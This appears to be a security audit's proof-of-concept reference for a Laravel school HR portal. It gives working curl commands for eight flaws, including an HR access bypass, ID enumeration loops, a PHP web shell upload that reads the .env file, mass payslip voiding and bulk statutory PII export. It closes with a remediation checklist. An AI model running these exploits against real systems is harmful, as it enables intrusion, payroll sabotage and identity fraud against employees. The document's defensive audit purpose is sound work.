# HR Portal — Proof of Concept (PoC) Reference
**Date:** June 11, 2026  
**Module:** HR Portal  
**Purpose:** Demonstrate exploitability of each security finding with concrete HTTP requests and expected outcomes  
**Environment:** Laravel application at `http://TARGET`  
**Prerequisite (unless otherwise stated):** Any valid user session

> **Note:** All PoCs use `curl` with a session cookie. Obtain a valid session cookie by logging in and copying the `laravel_session` cookie value.

---

## PoC Index

| # | ID | Title | Severity | Auth Required |
|---|---|---|---|---|
| 1 | HR-01 | Middleware bypass via `refid` session manipulation | CRITICAL | Any login |
| 2 | HR-02 | Read all HR notifications as any user | HIGH | Any login |
| 3 | HR-03 | Access employee payroll and DTR as a student | HIGH | Any login |
| 4 | HR-04 | Upload PHP web shell as employee credential | HIGH | HR session (or via PoC 1) |
| 5 | HR-06 | Read any employee's salary and statutory PII via IDOR | HIGH | HR session |
| 6 | HR-07 | Void any released payslip without authorization | HIGH | HR session |
| 7 | HR-09 | Overwrite employee attendance via crafted last-name collision | MEDIUM | HR session |
| 8 | HR-08 | Download bulk statutory PII (SSS, TIN, PhilHealth, Pag-IBIG) | MEDIUM | HR session |

---

## PoC 1 — HR-01: `isHumanResource` Middleware Bypass via `refid == 26`

### Background
`AuthenticateHumanResource.php` checks `$refid == 26` where `$refid = DB::table('usertype')->where('id', Session::get('currentPortal'))->first()->refid`. Any user who sets `currentPortal` to a `usertype.id` whose `refid` equals 26 passes the HR gate.

### Step 1 — Enumerate `usertype` IDs with `refid = 26`
Use the Director portal's employee data endpoint (confirmed vulnerable in `DIRECTOR_CODE_REVIEW.md`):
```
GET http://TARGET/director/passData?action=getemployees
Cookie: laravel_session=<student_or_teacher_session>
```
Parse the response for `otherportals` arrays which include `usertype.id` values. Alternatively, brute-force integers 1–100 by setting `currentPortal` and testing HR access. In most installs, HR usertype ID is small (commonly in range 1–30).

### Step 2 — Set `currentPortal` to a `usertype` with `refid = 26`
Identify any portal-switching endpoint that writes `currentPortal` to the session. Common examples include:
```
GET http://TARGET/switchportal?id=<USERTYPE_ID_WITH_REFID_26>
Cookie: laravel_session=<non_hr_session>
```
Or directly test HR access while varying the portal value by sending the `currentPortal` value in a session-modifying request if available.

### Step 3 — Verify HR Portal Access
```bash
curl -s -b "laravel_session=<NON_HR_SESSION>" \
  "http://TARGET/hr/employees/index" \
  -o response.html

grep -i "Employee" response.html | head -5
```
**Expected result without fix:** HTTP 200, HR employee list page loads.  
**Expected result with fix:** HTTP 302 redirect to `/home`.

### Alternative Bypass — `currentPortal == 10`
If a portal-switching endpoint sets `currentPortal` to any integer:
```bash
curl -s -X POST -b "laravel_session=<NON_HR_SESSION>" \
  "http://TARGET/switchportal" \
  -d "portalid=10" \
  -c updated_cookies.txt

curl -s -b updated_cookies.txt \
  "http://TARGET/hr/employees/index" \
  -o hr_test.html
```
**Expected:** HR portal access granted without HR user type.

---

## PoC 2 — HR-02: Read All HR Notifications as Any Authenticated User

### Background
HR notification routes are under `['auth', 'web']` only — no `isHumanResource` check. Any authenticated user can read all HR message threads.

### Prerequisites
- Any valid login session (student, teacher, cashier, parent, etc.)

### Step 1 — Get All HR Messages
```bash
curl -s -b "laravel_session=<ANY_VALID_SESSION>" \
  "http://TARGET/hr/settings/notification/getAllMessages" \
  -H "Accept: application/json"
```
**Expected result without fix:** JSON array of all HR notification messages, including sender, recipient, subject, and body text.

### Step 2 — Send HR Notification as a Student
```bash
curl -s -X POST \
  -b "laravel_session=<ANY_VALID_SESSION>" \
  -H "X-CSRF-TOKEN: <TOKEN>" \
  "http://TARGET/hr/settings/notification/sendnotification" \
  -d "recipient=all&subject=Urgent+HR+Notice&message=All+employees+report+to+HR+on+Monday"
```
**Expected result without fix:** HTTP 200, notification sent to all employees from the student's session.  
**Verification:** Log in as any employee and check HR notification inbox — the student's message appears as an official HR notification.

### Step 3 — Upload File Attachment
```bash
curl -s -X POST \
  -b "laravel_session=<ANY_VALID_SESSION>" \
  -F "attachment=@malicious.pdf" \
  "http://TARGET/hr/settings/notification/uploadattachedfile"
```
**Expected result without fix:** HTTP 200, file stored in HR attachment directory.

---

## PoC 3 — HR-03: Student Reads Employee Payroll Details and Daily Time Records

### Background
`/employeepayrolldetails`, `/employeedailytimerecord/{id}`, and `/applyleave/{id}` are under `['auth', 'web']` with no ownership verification.

### Prerequisites
- Any valid login session (e.g., student account)
- Any employee ID (integer, discoverable by iteration)

### Step 1 — Read Employee Payroll History
```bash
# Start with id=1, increment to find employees
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/employeepayrolldetails?employeeid=1"
```
**Expected result without fix:** Payroll detail page for Employee ID 1, including salary amounts, deductions, and payment dates.

### Step 2 — Read Employee Daily Time Records
```bash
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/employeedailytimerecord/1"
```
**Expected result without fix:** Full daily time record for Employee ID 1 — all punch-in/punch-out history.

### Step 3 — Enumerate Multiple Employees
```bash
for i in $(seq 1 50); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "laravel_session=<STUDENT_SESSION>" \
    "http://TARGET/employeedailytimerecord/$i")
  if [ "$STATUS" = "200" ]; then
    echo "Employee ID $i: accessible"
  fi
done
```
**Expected result without fix:** HTTP 200 for every valid employee ID. The student's session gives read access to every employee's time records.

---

## PoC 4 — HR-04: PHP Web Shell Upload via Employee Credential

### Background
`HREmployeeCredentialsController::tabcredsupload()` uses `$file->getClientOriginalExtension()` for the stored filename extension. Files are stored in `public/employeecredentials/`. An attacker uploads a `.php` file.

### Prerequisites
- HR-authenticated session (or achieved via PoC 1)

### Step 1 — Prepare the Web Shell
Create a file named `shell.php`:
```php
<?php
if (isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
?>
```

### Step 2 — Upload as Employee Credential
```bash
# Identify a valid employee ID from the employee list
EMPLOYEE_ID=5
CSRF_TOKEN="<TOKEN>"

curl -s -X POST \
  -b "laravel_session=<HR_SESSION>" \
  -F "credential=@shell.php;type=application/pdf" \
  -F "employeeid=$EMPLOYEE_ID" \
  -F "description=certificate" \
  -F "_token=$CSRF_TOKEN" \
  "http://TARGET/hr/employees/profile/tabcreds/upload"
```
**Expected result:** HTTP 200. File saved to `public/employeecredentials/certificate/<email>-<LASTNAME>.php`.

### Step 3 — Execute the Web Shell
Determine the employee's email from the employee list:
```bash
curl -s "http://TARGET/employeecredentials/certificate/johndoe@school.edu-SMITH.php?cmd=id"
```
**Expected result without fix:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Remote code execution as the web server process user.

### Step 4 — Escalate (Optional Demonstration)
```bash
# Dump environment variables (may reveal DB credentials)
curl "http://TARGET/employeecredentials/certificate/johndoe@school.edu-SMITH.php?cmd=printenv"

# Read Laravel .env file
curl "http://TARGET/employeecredentials/certificate/johndoe@school.edu-SMITH.php?cmd=cat+/var/www/html/.env"
```

---

## PoC 5 — HR-06: IDOR — Read Any Employee's Salary and Statutory IDs

### Background
`HREmployeeProfileController::index()` accepts `employeeid` from query string with no ownership check. Any HR user (even a payroll clerk for one department) can read any employee's full profile.

### Prerequisites
- HR-authenticated session

### Step 1 — Read Employee Profile
```bash
curl -s -b "laravel_session=<HR_SESSION>" \
  "http://TARGET/hr/employees/profile/index?employeeid=1" \
  -H "Accept: application/json"
```
**Expected result without fix:** Full profile including `sssid`, `philhealtid`, `pagibigid`, `tinid`, bank account numbers, salary amount, and salary basis type.

### Step 2 — Read Employee Salary Info Tab
```bash
curl -s -X POST \
  -b "laravel_session=<HR_SESSION>" \
  -d "employeeid=1&_token=<TOKEN>" \
  "http://TARGET/hr/employees/profile/tabsalaryinfo"
```
**Expected result without fix:** Salary basis type, monthly rate, bank account details for Employee ID 1.

### Step 3 — Enumerate All Employees
```bash
for i in $(seq 1 200); do
  curl -s -b "laravel_session=<HR_SESSION>" \
    "http://TARGET/hr/employees/getprofile?empid=$i" \
    -H "Accept: application/json" \
    -o "employee_$i.json" 2>/dev/null
  
  if [ -s "employee_$i.json" ]; then
    echo "Employee $i: data retrieved"
    cat "employee_$i.json" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('sssid',''), d.get('tinid',''))" 2>/dev/null
  fi
done
```
**Expected result without fix:** JSON files for every active employee with full PII.

---

## PoC 6 — HR-07: Void Any Employee's Released Payslip

### Background
`HRPayrollV3Controller::voidpayslip()` performs a destructive update (sets `released=0, deleted=1, void=1`) with no secondary authorization. Any HR user voids any payslip.

### Prerequisites
- HR-authenticated session
- `payrollid` from the target payslip (obtainable from payroll history pages)

### Step 1 — Identify a Payroll ID
```bash
# Access payroll history for any employee
curl -s -b "laravel_session=<HR_SESSION>" \
  "http://TARGET/hr/payrollv3/index?employeeid=1"
# Parse the response for payrollid values in the DOM or data- attributes
```

### Step 2 — Void the Payslip
```bash
PAYROLL_ID=42
EMPLOYEE_ID=1

curl -s -b "laravel_session=<HR_SESSION>" \
  "http://TARGET/hr/payrollv3/voidpayslip?payrollid=${PAYROLL_ID}&employeeid=${EMPLOYEE_ID}&voidremarks=Incorrect"
```
**Expected result without fix:** HTTP 200. Database update:
```sql
UPDATE hr_payrollv2history
SET released = 0, deleted = 1, void = 1, voidby = <attacker_id>, voiddatetime = NOW()
WHERE payrollid = 42 AND employeeid = 1;
```
The released payslip is permanently voided. No approval email sent. No reversal mechanism.

### Step 3 — Verify Destruction
```bash
curl -s -b "laravel_session=<HR_SESSION>" \
  "http://TARGET/hr/payrollv3/index?employeeid=1"
# Payroll ID 42 no longer appears in released payslips
```

### Step 4 — Batch Void All Payslips for a Payroll Period
```bash
# Enumerate payrollids for all employees in payroll period X
for PAYROLL_ID in $(seq 100 200); do
  curl -s -b "laravel_session=<HR_SESSION>" \
    "http://TARGET/hr/payrollv3/voidpayslip?payrollid=${PAYROLL_ID}&employeeid=0&voidremarks=System+Error"
done
# Entire payroll period records voided in seconds
```

---

## PoC 7 — HR-09: Attendance Overwrite via Last-Name Collision in Excel Upload

### Background
`upload_attendance()` matches uploaded Excel rows to employees by `UPPER(lastname)` only. An attacker can upload an Excel file that targets a specific employee by last name, overwriting their attendance records.

### Prerequisites
- HR-authenticated session
- Target employee's last name (visible from employee list export)

### Step 1 — Prepare Malicious Excel File
Create an Excel/CSV file with:
```
Name       | Date       | Time In  | Time Out
SANTOS     | 2026-06-01 | 08:00:00 | 18:00:00
SANTOS     | 2026-06-02 | 08:00:00 | 18:00:00
...
```
This will overwrite all attendance records for any active employee whose `UPPER(lastname)` is `SANTOS` during that date range.

### Step 2 — Upload the File
```bash
curl -s -X POST \
  -b "laravel_session=<HR_SESSION>" \
  -F "attendancefile=@fabricated_attendance.xlsx" \
  -F "_token=<TOKEN>" \
  "http://TARGET/attendance/upload"
```
**Expected result without fix:** HTTP 200. The controller:
1. Looks up `teacher` where `UPPER(lastname) = 'SANTOS'`
2. Deletes all `taphistory` records for that employee on those dates
3. Inserts the fabricated 08:00–18:00 times (removing any real absence or late entries)

### Step 3 — Verify Impact on Payroll
At next payroll generation, the targeted employee's attendance shows no late marks and no absences for the manipulated dates — resulting in a higher gross pay or suppressed deductions.

### Collision Scenario (BUG-HR-06)
If there are two employees with the same last name (e.g., `REYES, Maria` and `REYES, Jose`), `keyBy('lastname')` keeps only the last one returned by the DB. The first employee's attendance is silently skipped — no error, no warning:
```bash
# Upload file targeting "REYES"
# Only the last "REYES" in the DB gets updated
# The other "REYES" employee's attendance is not processed — no feedback to uploader
```

---

## PoC 8 — HR-08: Bulk Download All Employee Statutory PII

### Background
The employee list export includes SSS, PhilHealth, Pag-IBIG, and TIN numbers for ALL employees with no department filter.

### Prerequisites
- HR-authenticated session

### Step 1 — Trigger Excel Export
```bash
curl -s -b "laravel_session=<HR_SESSION>" \
  "http://TARGET/hr/employees/index?export=excel" \
  -o employee_export.xlsx
```

### Step 2 — Parse Exported PII
```python
import openpyxl

wb = openpyxl.load_workbook('employee_export.xlsx')
ws = wb.active

for row in ws.iter_rows(min_row=2, values_only=True):
    name   = f"{row[2]} {row[1]}"   # firstname, lastname
    sss    = row[18]                  # column S
    phic   = row[19]                  # column T
    pagibig = row[20]                 # column U
    tin    = None                     # TIN in separate column depending on version
    print(f"{name}: SSS={sss}, PHIC={phic}, PAGIBIG={pagibig}")
```

**Expected result without fix:** Full statutory ID numbers for every employee exported in a single HTTP request. This file alone is sufficient to submit fraudulent SSS loan applications, PhilHealth claims, or Pag-IBIG transactions on behalf of the employees.

---

## Remediation Verification Checklist

After applying fixes, verify each issue is resolved:

| PoC | Verification Test | Expected After Fix |
|---|---|---|
| PoC 1 (HR-01) | Set `currentPortal` to a non-HR type and request `/hr/employees/index` | HTTP 302 redirect to `/home` |
| PoC 2 (HR-02) | Student session requests `/hr/settings/notification/getAllMessages` | HTTP 302 or HTTP 403 |
| PoC 3 (HR-03) | Student requests `/employeedailytimerecord/1` | Redirected to login or 403 |
| PoC 4 (HR-04) | Upload `shell.php` via credential upload | 422 error: extension not allowed |
| PoC 5 (HR-06) | HR clerk from Dept A requests `getprofile?empid=<Dept_B_employee>` | 403 or empty response |
| PoC 6 (HR-07) | Request `voidpayslip` without PIN/token | 403 or PIN required error |
| PoC 7 (HR-09) | Upload Excel with last-name-only match | 422 error: employee number required |
| PoC 8 (HR-08) | Request employee export | Response scoped to authorized departments only |
